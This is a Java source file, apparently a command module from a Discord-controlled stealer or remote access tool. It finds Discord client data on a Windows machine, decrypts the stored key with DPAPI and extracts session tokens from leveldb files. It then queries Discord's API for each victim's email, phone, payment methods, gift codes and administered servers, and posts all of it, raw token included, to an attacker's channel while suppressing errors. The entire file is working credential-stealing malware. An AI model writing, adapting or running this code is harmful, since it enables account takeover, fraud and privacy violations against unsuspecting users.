package Sync.Intent.Commands.info;

import com.google.gson.JsonObject;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import Sync.Intent.Ducks.Commands.Command;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.GeneralSecurityException;
import java.security.Key;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DiscordCommand extends Command {
    public static final List<String> paths = new ArrayList<String>(Arrays.asList(System.getProperty("user.home") + "/AppData/Roaming/discord/", System.getProperty("user.home") + "/AppData/Roaming/discordcanary/", System.getProperty("user.home") + "/AppData/Roaming/discordptb/", System.getProperty("user.home") + "/AppData/Roaming/Lightcord/"));

    public DiscordCommand() {
        super(new String[]{"discord", "tokens", "token"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        Set<String> foundTokens = findTokens();

        if (foundTokens.isEmpty()) {
            channel.sendMessage("No Discord tokens found.").queue();
            return;
        }
        channel.sendMessage("Found " + foundTokens.size() + " potential token(s). Validating and fetching info...").queue();
        foundTokens.forEach(token -> processToken(token, channel));
    }

    public static Set<String> findTokens() {
        Set<String> foundTokens = new HashSet<>();
        for (String discordClientPath : DiscordCommand.paths) {
            try {
                String localStateFilePath = discordClientPath + "Local State";
                File localStateFile = new File(localStateFilePath);

                if (!localStateFile.exists()) {
                    continue;
                }

                byte[] key = DiscordCommand.getDecryptionKey(localStateFilePath);
                String[] tokensArray = DiscordCommand.extractTokens(discordClientPath, key);
                foundTokens.addAll(Arrays.asList(tokensArray));
            } catch (Exception e) {
                // Ignore errors
            }
        }
        return foundTokens;
    }

    public static byte[] getDecryptionKey(String localStatePath) throws IOException {
        String jsonContent = new String(Files.readAllBytes(Paths.get(localStatePath, new String[0])));
        JsonObject jsonObject = JsonParser.parseString(jsonContent).getAsJsonObject();
        String encryptedKey = jsonObject.getAsJsonObject("os_crypt").get("encrypted_key").getAsString();
        byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedKey);
        byte[] keyBytes = new byte[encryptedKeyBytes.length - 5];
        System.arraycopy(encryptedKeyBytes, 5, keyBytes, 0, keyBytes.length);
        return Crypt32Util.cryptUnprotectData(keyBytes);
    }

    public static String[] extractTokens(String discordPath, byte[] decryptionKey) {
        HashSet<String> tokens = new HashSet<String>();
        Pattern basicPattern = Pattern.compile("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{27,38}");
        Pattern newPattern = Pattern.compile("mfa\\.[\\w-]{84}");
        Pattern encryptedPattern = Pattern.compile("dQw4w9WgXcQ:([^\"']+)");
        File[] dbFiles = new File(discordPath + "/Local Storage/leveldb/").listFiles((dir, name) -> name.endsWith(".ldb"));
        if (dbFiles != null) {
            for (File file : dbFiles) {
                try {
                    String contents = new String(Files.readAllBytes(file.toPath()));
                    DiscordCommand.addMatchesToSet(tokens, contents, basicPattern);
                    DiscordCommand.addMatchesToSet(tokens, contents, newPattern);
                    DiscordCommand.addEncryptedMatchesToSet(tokens, contents, encryptedPattern, decryptionKey);
                }
                catch (IOException | GeneralSecurityException e) {
                    throw new RuntimeException(e);
                }
            }
        }
        return tokens.toArray(new String[0]);
    }

    private static void addMatchesToSet(Set<String> tokens, String contents, Pattern pattern) {
        Matcher matcher = pattern.matcher(contents);
        while (matcher.find()) {
            tokens.add(matcher.group());
        }
    }

    private static void addEncryptedMatchesToSet(Set<String> tokens, String contents, Pattern pattern, byte[] decryptionKey) throws GeneralSecurityException, IOException {
        Matcher matcher = pattern.matcher(contents);
        while (matcher.find()) {
            String encryptedData = matcher.group(1);
            String token = DiscordCommand.decryptToken(Base64.getDecoder().decode(encryptedData), decryptionKey);
            tokens.add(token);
        }
    }

    private static String decryptToken(byte[] buffer, byte[] decryptionKey) throws GeneralSecurityException {
        byte[] encryptedData = new byte[buffer.length - 15];
        System.arraycopy(buffer, 15, encryptedData, 0, encryptedData.length);
        byte[] nonce = new byte[12];
        System.arraycopy(buffer, 3, nonce, 0, nonce.length);
        SecretKeySpec keySpec = new SecretKeySpec(decryptionKey, "AES");
        GCMParameterSpec gcmSpec = new GCMParameterSpec(128, nonce);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(2, (Key)keySpec, gcmSpec);
        byte[] decryptedBytes = cipher.doFinal(encryptedData);
        return new String(decryptedBytes).trim();
    }

    private void processToken(String token, TextChannel channel) {
        try {
            JsonObject userObject = apiRequest("/users/@me", token);
            if (userObject == null || userObject.has("message")) {
                return;
            }

            EmbedBuilder embed = new EmbedBuilder();
            embed.setTitle("Discord Account Info");
            embed.setColor(0x5865F2); // Modern Discord Blurple

            String userId = userObject.get("id").getAsString();
            String username = userObject.get("username").getAsString();
            String discriminator = userObject.has("discriminator") && !"0".equals(userObject.get("discriminator").getAsString()) ? "#" + userObject.get("discriminator").getAsString() : "";
            String avatarHash = userObject.get("avatar").isJsonNull() ? null : userObject.get("avatar").getAsString();
            String pfpUrl = (avatarHash == null) ? "https://cdn.discordapp.com/embed/avatars/0.png" : "https://cdn.discordapp.com/avatars/" + userId + "/" + avatarHash + (avatarHash.startsWith("a_") ? ".gif" : ".png") + "?size=1024";

            embed.setThumbnail(pfpUrl);
            
            // Basic Info
            embed.addField("User", "`" + username + discriminator + "`", true);
            embed.addField("ID", "`" + userId + "`", true);
            
            // Email & Phone
            String email = userObject.get("email").isJsonNull() ? "None" : userObject.get("email").getAsString();
            String phone = userObject.has("phone") && !userObject.get("phone").isJsonNull() ? userObject.get("phone").getAsString() : "None";
            embed.addField("Email", "`" + email + "`", true);
            embed.addField("Phone", "`" + phone + "`", true);

            // Nitro & 2FA
            int premiumType = userObject.get("premium_type").getAsInt();
            String nitroStatus = "None";
            if (premiumType == 1) nitroStatus = "Nitro Classic";
            if (premiumType == 2) nitroStatus = "Nitro";
            if (premiumType == 3) nitroStatus = "Nitro Basic";
            boolean mfaEnabled = userObject.get("mfa_enabled").getAsBoolean();
            
            embed.addField("Nitro", nitroStatus, true);
            embed.addField("2FA", mfaEnabled ? "Enabled" : "Disabled", true);

            // Token
            embed.addField("Token", "||" + token + "||", false);

            // Friends
            try {
                com.google.gson.JsonArray relationships = apiRequestArray("/users/@me/relationships", token);
                long friendCount = 0;
                if (relationships != null) {
                    for (JsonElement rel : relationships) {
                        if (rel.getAsJsonObject().get("type").getAsInt() == 1) {
                            friendCount++;
                        }
                    }
                }
                embed.addField("Friends", String.valueOf(friendCount), false);
            } catch (Exception ignored) {}

            // Payment Methods
            try {
                com.google.gson.JsonArray paymentSources = apiRequestArray("/users/@me/billing/payment-sources", token);
                StringBuilder payments = new StringBuilder();
                if (paymentSources != null && paymentSources.size() > 0) {
                    for (JsonElement source : paymentSources) {
                        JsonObject s = source.getAsJsonObject();
                        if (s.get("type").getAsInt() == 1) { // Credit Card
                            payments.append("`").append(s.get("brand")).append("` (**** ").append(s.get("last_4")).append(")\n");
                        } else if (s.get("type").getAsInt() == 2) { // PayPal
                            payments.append("`PayPal` (`").append(s.get("email").getAsString()).append("`)\n");
                        }
                    }
                }
                if (payments.length() > 0) {
                    embed.addField("Payment Methods", payments.toString(), false);
                } else {
                    embed.addField("Payment Methods", "None", false);
                }
            } catch (Exception ignored) {}

            // Gift Codes
            try {
                com.google.gson.JsonArray gifts = apiRequestArray("/users/@me/billing/entitlements?exclude_consumed=true", token);
                StringBuilder giftCodes = new StringBuilder();
                if (gifts != null && gifts.size() > 0) {
                    for (JsonElement giftElement : gifts) {
                        JsonObject gift = giftElement.getAsJsonObject();
                        if (gift.has("promotion_id") && !gift.get("promotion_id").isJsonNull()) {
                            giftCodes.append("`").append(gift.getAsJsonObject("sku").get("name").getAsString()).append("`\n");
                        }
                    }
                }
                if (giftCodes.length() > 0) {
                    embed.addField("Gift Codes", giftCodes.toString(), false);
                } else {
                    embed.addField("Gift Codes", "None", false);
                }
            } catch (Exception ignored) {}

            // Guilds (Admin only)
            try {
                com.google.gson.JsonArray guilds = apiRequestArray("/users/@me/guilds?with_counts=true", token);
                StringBuilder adminGuilds = new StringBuilder();
                int adminCount = 0;
                if (guilds != null) {
                    for (JsonElement guild : guilds) {
                        JsonObject g = guild.getAsJsonObject();
                        if (g.has("permissions") && (g.get("permissions").getAsLong() & 0x8) == 0x8) { // Administrator permission
                            adminCount++;
                            if (adminCount <= 10) { // Limit to 10 to prevent overflow
                                adminGuilds.append("`").append(g.get("name").getAsString()).append("` (~").append(g.get("approximate_member_count").getAsInt()).append(")\n");
                            }
                        }
                    }
                }
                if (adminCount > 0) {
                    if (adminCount > 10) adminGuilds.append("...and ").append(adminCount - 10).append(" more.");
                    embed.addField("Admin Guilds (" + adminCount + ")", adminGuilds.toString(), false);
                }
            } catch (Exception ignored) {}

            embed.setTimestamp(java.time.Instant.now());

            channel.sendMessageEmbeds(embed.build()).queue();

        } catch (Exception e) {
            // Silently fail
        }
    }

    private JsonObject apiRequest(String endpoint, String token) {
        try {
            URL url = new URL("https://discord.com/api/v9" + endpoint);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("Authorization", token);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (InputStream inputStream = connection.getInputStream();
                     InputStreamReader reader = new InputStreamReader(inputStream)) {
                    JsonElement element = JsonParser.parseReader(reader);
                    return element.isJsonObject() ? element.getAsJsonObject() : null;
                }
            } else {
                return null;
            }
        } catch (IOException e) {
            return null;
        }
    }

    private com.google.gson.JsonArray apiRequestArray(String endpoint, String token) {
        try {
            URL url = new URL("https://discord.com/api/v9" + endpoint);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("Authorization", token);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (InputStream inputStream = connection.getInputStream(); InputStreamReader reader = new InputStreamReader(inputStream)) {
                    JsonElement element = JsonParser.parseReader(reader);
                    return element.isJsonArray() ? element.getAsJsonArray() : null;
                }
            } else {
                return null;
            }
        } catch (IOException e) {
            return null;
        }
    }
}
